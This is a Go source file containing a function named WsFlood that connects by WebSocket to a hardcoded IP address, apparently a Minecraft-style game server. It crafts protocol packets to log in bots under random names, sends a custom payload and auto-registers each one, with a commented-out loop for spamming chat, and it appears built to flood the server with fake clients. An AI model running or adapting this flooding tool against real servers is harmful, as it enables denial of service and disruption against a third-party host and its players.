package main

import (
	"log"
	"math/rand"
	"time"

	"github.com/gorilla/websocket"
)

func WsFlood(motd bool) {
	c, _, err := websocket.DefaultDialer.Dial("ws://43.248.189.71:2107/", nil)
	if err != nil {
		log.Println("dial:", err)
		return
	}
	defer c.Close()

	if motd {
		err = c.WriteMessage(websocket.TextMessage, []byte("Accept: MOTD"))
	} else {
		err = c.WriteMessage(websocket.BinaryMessage, buildLoginPacket("Liuli_"+RandStringRunes(5), "43.248.189.71:2107"))
		err = c.WriteMessage(websocket.BinaryMessage, buildCustomPayload("EAG|MySkin", []byte{0x04, byte(rand.Intn(64))}))
	}
	if err != nil {
		log.Println(err)
		return
	}
	if !motd {
		go func() {
			time.Sleep(2 * time.Second)
			var errr error
			errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/register 114514 114514"))
			errr = c.WriteMessage(websocket.BinaryMessage, buildChat("/login 114514"))
			if errr != nil {
				log.Println("read:", errr)
				return
			}
			// cnt := 0
			// for true {
			// 	time.Sleep(1 * time.Second)
			// 	// errr = c.WriteMessage(websocket.BinaryMessage, buildChat("Liulihaocai#3747 >> "+RandStringRunes(30)))
			// 	errr = c.WriteMessage(websocket.BinaryMessage, buildChat(GetWord()))
			// 	if errr != nil {
			// 		log.Println("read:", errr)
			// 		return
			// 	}
			// 	cnt++
			// }
		}()
	}
	for true {
		// _, msg, err := c.ReadMessage()
		_, _, err := c.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			return
		}
		// if msg[0] == 3 {
		// 	log.Printf("receive: %s\n", msg)
		// }
		// if motd {
		// 	return
		// }
		// log.Printf("receive: %s\n", msg)
		// return
	}
}

func buildLoginPacket(username string, server string) []byte {
	b := []byte{0x02, 69}
	b = writeString(b, username)
	b = writeString(b, server)
	b = append(b, []byte{0x00, 0x00, 0x0b, 0x3b}...)
	return b
}

func buildCustomPayload(channel string, msg []byte) []byte {
	b := []byte{0xfa}
	b = writeString(b, channel)
	b = writeShort(b, len(msg))
	b = append(b, msg...)
	return b
}

func buildClientInfo(lang string) []byte {
	b := []byte{0xcc}
	b = writeString(b, lang)
	b = append(b, []byte{0x01, 0x0b, 0x02, 0x01}...)
	return b
}

func buildChat(msg string) []byte {
	b := []byte{0x03}
	b = writeString(b, msg)
	return b
}

func buildChatAdv(msg []byte) []byte {
	b := []byte{0x03}
	b = writeShort(b, len(msg)/2)
	b = append(b, msg...)
	return b
}

func writeString(b []byte, str string) []byte {
	tmp := []byte{}
	length := 0
	for _, c := range str {
		tmp = writeShort(tmp, int(c))
		length++
	}
	b = writeShort(b, length)
	b = append(b, tmp...)
	return b
}

func writeShort(b []byte, num int) []byte {
	b = append(b, byte(num>>8&255))
	b = append(b, byte(num>>0&255))
	return b
}
